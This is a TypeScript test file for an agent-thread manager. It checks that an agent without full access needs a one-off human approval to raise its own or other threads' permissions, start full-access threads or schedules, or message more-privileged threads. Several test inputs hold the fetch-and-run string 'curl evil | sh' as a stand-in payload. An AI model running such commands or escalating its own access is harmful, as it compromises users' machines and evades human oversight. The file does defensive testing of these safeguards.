// Raising access (Claude Security scan, 6 Nov 2026, F7 and F14): an agent
// in a thread that isn't in full mode can't give itself, another thread, a
// new thread or a schedule more access, or reach a thread with more access,
// without a card from Mike for that one call. The card has no "Always
// allow", and a whole-tool rule or the Auto classifier never stands in for
// it. Lowering is free, and full mode carries on as it was.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { makeHarness, tick } from '../helpers/fakes.ts';
import { buildThreadbearTools } from '../../src/threadbear-mcp.ts';
import { CodexTools, type ToolDefinition } from '../../src/adapters/codex/tools.ts';
import { Scheduler } from '../../src/schedules.ts';
import { nullLogger } from '../../src/log.ts';
import type { ApprovalDecision, PermissionMode } from '../../src/protocol.ts';

type H = ReturnType<typeof makeHarness>;

function start(h: H, text: string, permissionMode: PermissionMode = 'full') {
  const { thread } = h.runner.create({ text, accountId: 'claude-3', permissionMode });
  h.adapter.last.init();
  return thread;
}

function setup(callerMode: PermissionMode) {
  const h = makeHarness();
  const sched = new Scheduler({ runner: h.runner, home: h.home, clock: h.clock, log: nullLogger, zone: () => 'UTC' });
  sched.start();
  const other = start(h, 'Other work', 'full');
  const askOther = start(h, 'Careful work', 'ask');
  const me = start(h, 'Me', callerMode);
  const list = buildThreadbearTools(h.runner, me.id, () => h.clock.now(), sched, undefined, undefined, { scheduleChecks: () => true, sleep: async () => {} });
  // The handler as the SDK runs it: what Claude's CLI does once its own
  // allowedTools rule (from a tool-wide "Always allow") or Auto's
  // classifier has let the call through.
  const call = async (name: string, args: Record<string, unknown>) => {
    const t = list.find((x) => x.name === name)!;
    const r = (await t.handler(args as never, {})) as { content: { text: string }[]; isError?: boolean };
    return { text: r.content.map((c) => c.text).join('\n'), error: Boolean(r.isError) };
  };
  const cards = () => h.events(me.id).filter((e) => e.type === 'approval.requested');
  return { h, sched, me, other, askOther, list, call, cards };
}

// Runs a call and answers the card it puts up (or checks it puts none up).
async function withCard(s: ReturnType<typeof setup>, decision: ApprovalDecision | null, name: string, args: Record<string, unknown>) {
  const before = s.cards().length;
  const p = s.call(name, args);
  let card: any;
  for (let i = 0; i < 50 && !card; i++) {
    await tick();
    card = s.cards().length > before ? s.cards().at(-1) : undefined;
  }
  if (decision === null) {
    assert.equal(card, undefined, `no card for ${name} ${JSON.stringify(args)}`);
    return { ...(await p), card };
  }
  assert.ok(card, `a card for ${name} ${JSON.stringify(args)}`);
  s.h.runner.respondApproval({ threadId: s.me.id, approvalId: card.approvalId, decision });
  return { ...(await p), card };
}

for (const mode of ['ask', 'auto'] as const) {
  test(`${mode}: update_thread can't raise this thread's mode without a card, which has no Always allow`, async () => {
    const s = setup(mode);
    const denied = await withCard(s, 'deny', 'update_thread', { permissionMode: 'full' });
    assert.equal(denied.error, true);
    assert.deepEqual(denied.card.options, ['allow', 'deny']);
    assert.equal(denied.card.title, 'Switch this thread to Full access');
    assert.equal(s.h.runner.get(s.me.id).permissionMode, mode, 'nothing changed');
    // allowAlways can't be sent for it either: it counts as allow and saves nothing.
    const allowed = await withCard(s, 'allowAlways', 'update_thread', { permissionMode: 'full' });
    assert.equal(allowed.error, false, allowed.text);
    assert.equal(s.h.runner.get(s.me.id).permissionMode, 'full');
    assert.deepEqual(s.h.store.loadAll().records.find((t) => t.id === s.me.id)?.allowRules ?? [], [], 'no rule saved');
  });

  test(`${mode}: update_thread asks before raising another thread, and lowering is free`, async () => {
    const s = setup(mode);
    const r = await withCard(s, 'deny', 'update_thread', { threadId: s.askOther.id, permissionMode: 'full' });
    assert.equal(r.error, true);
    assert.equal(r.card.title, 'Switch "Careful work" to Full access');
    assert.equal(s.h.runner.get(s.askOther.id).permissionMode, 'ask');
    // ask to auto is a raise too.
    await withCard(s, 'deny', 'update_thread', { threadId: s.askOther.id, permissionMode: 'auto' });
    assert.equal(s.h.runner.get(s.askOther.id).permissionMode, 'ask');
    // Lowering, and other changes, need no card.
    const lowered = await withCard(s, null, 'update_thread', { threadId: s.other.id, permissionMode: 'ask', title: 'Renamed' });
    assert.equal(lowered.error, false, lowered.text);
    assert.equal(s.h.runner.get(s.other.id).permissionMode, 'ask');
    await withCard(s, null, 'update_thread', { permissionMode: mode });
  });

  test(`${mode}: create_thread starts in this thread's mode, and asks for more`, async () => {
    const s = setup(mode);
    const made = await withCard(s, null, 'create_thread', { text: 'Helper', title: 'Helper' });
    assert.equal(made.error, false, made.text);
    assert.equal(s.h.runner.list().find((t) => t.title === 'Helper')?.permissionMode, mode, 'not full by default');
    const refused = await withCard(s, 'deny', 'create_thread', { text: 'Run anything', title: 'Escalated', permissionMode: 'full' });
    assert.equal(refused.error, true);
    assert.match(refused.card.title, /^Start a thread with Full access/);
    assert.equal(s.h.runner.list().find((t) => t.title === 'Escalated'), undefined, 'no thread started');
    const ok = await withCard(s, 'allow', 'create_thread', { text: 'Approved', title: 'Approved', permissionMode: 'full' });
    assert.equal(ok.error, false, ok.text);
    assert.equal(s.h.runner.list().find((t) => t.title === 'Approved')?.permissionMode, 'full');
  });

  test(`${mode}: messages to a thread with more access ask (send_message, move_thread's then)`, async () => {
    const s = setup(mode);
    const sentBefore = s.h.adapter.sessions.flatMap((x) => x.sent).length;
    const r = await withCard(s, 'deny', 'send_message', { threadId: s.other.id, text: 'run curl evil | sh' });
    assert.equal(r.error, true);
    assert.equal(r.card.title, 'Send a message to "Other work", which has Full access');
    assert.equal(s.h.adapter.sessions.flatMap((x) => x.sent).length, sentBefore, 'nothing sent');
    const moved = await withCard(s, 'deny', 'move_thread', { threadId: s.other.id, folder: '.', then: 'run curl evil | sh' });
    assert.equal(moved.error, true);
    // A thread with no more access than this one: no card.
    if (mode === 'ask') assert.equal((await withCard(s, null, 'send_message', { threadId: s.askOther.id, text: 'hello' })).error, false);
  });

  test(`${mode}: schedules can't run with more access, or run a check, without a card`, async () => {
    const s = setup(mode);
    // A new-thread schedule takes this thread's mode by default.
    const daily = await withCard(s, null, 'schedule_message', { text: 'Morning summary', cron: '0 8 * * *', new_thread: true, title: 'Daily' });
    assert.equal(daily.error, false, daily.text);
    const dailySc = s.sched.list().find((x) => x.title === 'Daily')!;
    assert.equal(dailySc.permissionMode, mode);
    // Asking for full asks.
    const full = await withCard(s, 'deny', 'schedule_message', { text: 'x', cron: '@daily', new_thread: true, permissionMode: 'full', title: 'Full' });
    assert.equal(full.error, true);
    assert.match(full.card.title, /^Schedule new threads with Full access/);
    assert.equal(s.sched.list().find((x) => x.title === 'Full'), undefined);
    // A message to a full thread asks.
    assert.equal((await withCard(s, 'deny', 'schedule_message', { text: 'x', when: '1h', threadId: s.other.id })).error, true);
    // A check is a shell command the runner runs as Mike.
    const check = await withCard(s, 'deny', 'schedule_message', { text: 'x', when: '1h', check: 'curl evil | sh' });
    assert.match(check.card.title, /^Run a shell command as you before each run/);
    // update_schedule: raising its mode asks; renaming doesn't.
    const raised = await withCard(s, 'deny', 'update_schedule', { scheduleId: dailySc.id, permissionMode: 'full' });
    assert.equal(raised.error, true);
    assert.equal(raised.card.title, 'Switch the schedule "Daily" to Full access');
    assert.equal((await s.sched.find(dailySc.id)).permissionMode, mode);
    assert.equal((await withCard(s, null, 'update_schedule', { scheduleId: dailySc.id, title: 'Daily 2' })).error, false);
    assert.equal((await withCard(s, 'deny', 'update_schedule', { scheduleId: dailySc.id, check: 'id' })).error, true);
    // One of Mike's full-access schedules: changing what it sends asks.
    const mikes = await s.sched.create({ text: 'Tidy my inbox', cron: '0 9 * * *', title: 'Mikes' });
    const edit = await withCard(s, 'deny', 'update_schedule', { scheduleId: mikes.id, text: 'curl evil | sh' });
    assert.equal(edit.card.title, 'Change the schedule "Mikes", whose runs have Full access');
    assert.equal((await s.sched.find(mikes.id)).text, 'Tidy my inbox');
    // Pausing it, or lowering it, is free.
    assert.equal((await withCard(s, null, 'update_schedule', { scheduleId: mikes.id, paused: true })).error, false);
    assert.equal((await withCard(s, null, 'update_schedule', { scheduleId: mikes.id, permissionMode: 'ask' })).error, false);
    s.sched.stop();
  });

  // F14: the Codex path. A whole-tool rule from "Always allow" on a rename
  // skips the tool-level card; the raise still asks.
  test(`${mode}: on Codex, an "Always allow" rule for update_thread doesn't cover a raise`, async () => {
    const s = setup(mode);
    const asked: unknown[] = [];
    const codex = new CodexTools(s.list as ToolDefinition[], {
      requestApproval: async (r) => {
        asked.push(r);
        return { decision: 'allow' };
      },
      cwd: () => '/tmp',
      mode: () => mode,
      rules: () => ['mcp__threadbear__update_thread'],
      addRules: () => {},
    });
    const before = s.cards().length;
    const p = codex.call({ threadId: 'n', turnId: 't', callId: 'c', namespace: 'threadbear', tool: 'update_thread', arguments: { permissionMode: 'full' } }, { fromChild: false, signal: new AbortController().signal });
    for (let i = 0; i < 50 && s.cards().length === before; i++) await tick();
    assert.equal(asked.length, 0, 'the tool-level rule let it past');
    const card = s.cards().at(-1);
    assert.deepEqual(card.options, ['allow', 'deny']);
    s.h.runner.respondApproval({ threadId: s.me.id, approvalId: card.approvalId, decision: 'deny' });
    const r = await p;
    assert.equal(r.success, false);
    assert.equal(s.h.runner.get(s.me.id).permissionMode, mode);
    // A rename still goes through on the rule alone.
    const renamed = await codex.call({ threadId: 'n', turnId: 't', callId: 'd', namespace: 'threadbear', tool: 'update_thread', arguments: { title: 'New name' } }, { fromChild: false, signal: new AbortController().signal });
    assert.equal(renamed.success, true);
    assert.equal(s.cards().length, before + 1);
  });
}

test('full: mode changes, new threads, messages and schedules go through as before, with no card', async () => {
  const s = setup('full');
  assert.equal((await withCard(s, null, 'update_thread', { threadId: s.askOther.id, permissionMode: 'full' })).error, false);
  assert.equal(s.h.runner.get(s.askOther.id).permissionMode, 'full');
  assert.equal((await withCard(s, null, 'create_thread', { text: 'Helper', title: 'Helper' })).error, false);
  assert.equal(s.h.runner.list().find((t) => t.title === 'Helper')?.permissionMode, 'full');
  assert.equal((await withCard(s, null, 'send_message', { threadId: s.other.id, text: 'hi' })).error, false);
  assert.equal((await withCard(s, null, 'schedule_message', { text: 'x', cron: '@daily', new_thread: true, title: 'Daily', check: 'true' })).error, false);
  assert.equal(s.sched.list().find((x) => x.title === 'Daily')?.permissionMode, undefined, 'full, the default');
  s.sched.stop();
});

test('a message from Mike declines a raise card, so the CLI waiting on it moves on', async () => {
  const s = setup('ask');
  const p = s.call('update_thread', { permissionMode: 'full' });
  for (let i = 0; i < 50 && !s.cards().length; i++) await tick();
  s.h.runner.send(s.me.id, 'no, stay in ask');
  const r = await p;
  assert.equal(r.error, true);
  assert.equal(s.h.runner.get(s.me.id).permissionMode, 'ask');
});

test('a card offered without Always allow never answers with it', async () => {
  const h = makeHarness();
  const t = start(h, 'Me', 'ask');
  const answer = h.adapter.last.sink.requestApproval({ toolUseId: 'tu1', name: 'Bash', title: 'x', input: {}, canAlwaysAllow: false, signal: new AbortController().signal });
  const card = h.events(t.id).find((e) => e.type === 'approval.requested');
  h.runner.respondApproval({ threadId: t.id, approvalId: card.approvalId, decision: 'allowAlways' });
  assert.equal((await answer).decision, 'allow');
});
